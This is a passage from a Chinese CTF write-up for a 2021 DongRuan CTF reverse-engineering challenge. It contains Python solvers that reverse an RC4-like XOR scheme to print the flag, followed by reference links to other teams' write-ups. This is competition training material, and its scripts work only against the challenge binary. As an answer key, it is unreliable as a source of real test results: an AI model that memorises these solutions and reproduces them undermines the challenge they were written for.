xCB,0x00,0x00,0x00,0xEB,0x00,0x00,0x00,0xAD,0x00,0x00,0x00,0x16,0x00,0x00,0x00,0xD4,0x00,0x00,0x00,0x21,0x00,0x00,0x00,0xC6,0x00,0x00,0x00,0x95,0x00,0x00,0x00,0xC4,0x00,0x00,0x00,0x28,0x00,0x00,0x00,0x56,0x00,0x00,0x00,0xB7,0x00,0x00,0x00,0x68,0x00,0x00,0x00,0x6A,0x00,0x00,0x00,0xD1,0x00,0x00,0x00,0x9C,0x00,0x00,0x00,0x4B,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x9A,0x00,0x00,0x00,0xB5,0x00,0x00,0x00,0xAE,0x00,0x00,0x00,0x1F,0x00,0x00,0x00,0x94,0x00,0x00,0x00,0x7D,0x00,0x00,0x00,0xEC,0x00,0x00,0x00,0x62,0x00,0x00,0x00,0xC1,0x00,0x00,0x00,0x8A,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x53,0x00,0x00,0x00,0x3C,0x00,0x00,0x00,0x7C,0x00,0x00,0x00,0x4E,0x00,0x00,0x00,0xBB,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0xF7,0x00,0x00,0x00,0x2E,0x00,0x00,0x00,0x59,0x00,0x00,0x00,0x6B,0x00,0x00,0x00,0x79,0x00,0x00,0x00,0xD9,0x00,0x00,0x00,0xA9,0x00,0x00,0x00,0x82,0x00,0x00,0x00,0xC5,0x00,0x00,0x00,0xFB,0x00,0x00,0x00,0x23,0x00,0x00,0x00,0xB3,0x00,0x00,0x00,0xF2,0x00,0x00,0x00,0x72,0x00,0x00,0x00,0x83,0x00,0x00,0x00,0xEA,0x00,0x00,0x00,0xAB,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x0D,0x00,0x00,0x00,0xA0,0x00,0x00,0x00,0x73,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x41,0x00,0x00,0x00,0xF4,0x00,0x00,0x00,0x3D,0x00,0x00,0x00,0x42,0x00,0x00,0x00,0x2F,0x00,0x00,0x00,0x3A,0x00,0x00,0x00,0x8C,0x00,0x00,0x00,0xF8,0x00,0x00,0x00,0xCD,0x00,0x00,0x00,0x1D,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x66,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0xD8,0x00,0x00,0x00,0xBC
]

s = []
for i in range(22):
	s.append(byte[i]^0x22)

v5 = a1[0]
v6 = a1[4]
v9 = a1[8:]

for i in range(22):
    v5 = (v5 + 1)&0xff
    v7 = v9[4*v5]
    v6 = (v7 + v6)&0xff
    v8 = v9[4*v6]
    v9[4*v5] = v8
    v9[4*v6] = v7

    s[i] ^= v9[((v8 + v7)&0xff)*4]&0xff
    
for i in s:
	print (chr(i),end='')


```
ChaMd5战队exp更简洁，数据是动调出来的：
```python
data=[0x9E,0xE7,0x30,0x5F,0xA7,0x01,0xA6,0x53,0x59,0x1B,0x0A,0x20,0xF1,0x73,0xD1,0x0E,0xAB,0x09,0x84,0x0E,0x8D, 0x2B]
tem=[0xda,0xa9,0x73,0x1A,0xFE,0x4D,0xED,0x12,0x1E,0x66,0x5C,0x6D,0x8C,0x3C,0x96,0x49,0xFD,0x74,0xDF,0x43,0xDA,0x74]
flag=''
for i in range(22):
    flag+=chr(data[i]^tem[i]^0x22)
print(flag)
```
# Re -> easyRe

参考ChaMd5的WP

# 附件
[附件](https://github.com/1094093288/IMG/tree/master/Pwn/2021DongRuanCTF)
# 参考
1. [ChaMd5](https://mp.weixin.qq.com/s/KgxHOFH52EE8z7NnMTSIDA)
2. [地运](https://mp.weixin.qq.com/s/C0Vn_5NnGCd8Sn6--otsgA)
3. [or4nge](https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#web)
4. [官方](https://docs.qq.com/doc/DSVB0U3BIWHZ4RVRF)